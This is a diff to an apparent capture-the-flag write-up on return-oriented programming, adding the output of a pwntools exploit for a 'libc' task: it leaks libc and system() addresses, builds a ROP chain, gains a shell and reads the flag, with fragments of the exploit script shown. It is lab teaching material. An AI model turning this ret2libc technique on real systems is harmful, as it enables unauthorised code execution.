@@ -167,6 +167,29 @@ flag{Thr33_Tw0_D0N3}
 ```
 ##Task 5 - libc
 
+```console
+buzz@intro2rop:~/leaked_lib$ python2 exploit.py
+[+] Starting local process './leaked_lib': pid 12020
+[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
+[*] '/lib/i386-linux-gnu/libc-2.27.so'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+('address of libc:', '0xf7d6e000')
+('location of system:', '0xf7dab3d0')
+[*] Loading gadgets for '/lib/i386-linux-gnu/libc-2.27.so'
+[*] Switching to interactive mode
+
+Use me to read flag.txt!
+$ ls
+att  exploit.py  flag.txt  leaked_lib  leaked_lib.c
+$ cat flag.txt
+flag{l34k_2_pwn}
+
+```
+
 ```python
 from pwn import *
 
@@ -208,6 +231,5 @@ payload2 += rop.chain()
 p.sendline(payload2)
 
 p.interactive()
-
 ```
 
